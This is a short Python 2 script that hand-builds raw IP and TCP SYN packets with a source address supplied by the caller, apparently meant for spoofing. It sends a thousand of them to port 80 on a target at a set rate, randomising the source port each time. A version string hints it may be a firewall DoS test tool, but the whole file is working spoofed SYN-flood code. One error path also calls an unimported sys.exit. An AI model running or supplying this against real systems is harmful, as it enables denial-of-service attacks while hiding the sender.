#!/usr/bin/env python

# some imports
import random
import socket
from struct import *
from time import sleep
from sys import stdout, argv, exit

if len(argv) != 4:
	print "Usage: " + argv[0] + " <destination ip> <source ip> <rate>"
        print "Version: AFM v15.1"
        exit(0)

# checksum functions needed for calculation checksum
def checksum(msg):
	s = 0
	# loop taking 2 characters at a time
	for i in range(0, len(msg), 2):
		w = (ord(msg[i]) << 8) + (ord(msg[i+1]) )
		s = s + w
	
	s = (s>>16) + (s & 0xffff);
	#s = s + (s >> 16);
	#complement and mask to 4 byte short
	s = ~s & 0xffff
	
	return s

#create a raw socket
try:
	s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
except socket.error , msg:
	print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
	sys.exit()

# tell kernel not to put in headers, since we are providing it
s.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)
	
# now start constructing the packet
packet = '';

dest_ip = argv[1]
source_ip = argv[2]
pkt_rate = float(argv[3])

# ip header fields
ihl = 5 
version = 4
tos = 0
tot_len = 20 + 20 
id = 54321	
frag_off = 0
ttl = 255
protocol = socket.IPPROTO_TCP
check = 10	
saddr = socket.inet_aton ( source_ip )	
daddr = socket.inet_aton ( dest_ip )

ihl_version = (version << 4) + ihl

# the ! in the pack format string means network order
ip_header = pack('!BBHHHBBH4s4s' , ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)

# tcp header fields
source = random.randint(1,65535)
dest = 80
seq = 0
ack_seq = 0
doff = 5	

#tcp flags
fin = 0
syn = 1
rst = 0
psh = 0
ack = 0
urg = 0
window = socket.htons (5840)	
check = 0
urg_ptr = 0

offset_res = (doff << 4) + 0
tcp_flags = fin + (syn << 1) + (rst << 2) + (psh <<3) + (ack << 4) + (urg << 5)

for i in xrange(1000):
 # the ! in the pack format string means network order
 tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, check, urg_ptr)

 # pseudo header fields
 source_address = socket.inet_aton( source_ip )
 dest_address = socket.inet_aton(dest_ip)
 placeholder = 0
 protocol = socket.IPPROTO_TCP
 tcp_length = len(tcp_header)

 psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
 psh = psh + tcp_header;

 tcp_checksum = checksum(psh)

 # make the tcp header again and fill the correct checksum
 tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, tcp_checksum , urg_ptr)

 # final full packet - syn packets dont have any data
 packet = ip_header + tcp_header
 s.sendto(packet, (dest_ip , 0 ))
 stdout.write("*")
 stdout.flush()
 sleep(pkt_rate)
 source = random.randint(1,65535)
print ""
